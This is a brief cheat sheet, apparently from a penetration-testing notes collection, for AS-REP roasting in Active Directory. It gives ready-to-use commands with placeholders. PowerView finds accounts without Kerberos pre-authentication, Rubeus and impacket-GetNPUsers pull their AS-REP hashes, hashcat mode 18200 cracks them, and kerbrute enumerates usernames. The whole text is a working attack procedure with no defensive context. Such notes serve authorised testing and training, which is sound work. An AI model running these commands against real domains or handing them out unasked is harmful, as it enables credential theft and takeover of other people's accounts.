==Obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled==
### Rubeus
```
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
.\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
hashcat -m 18200 <HASH> <WORDLIST>
```
### Kerbrute
```
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERNAMES>
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -no-pass -usersfile <USERNAMES>
```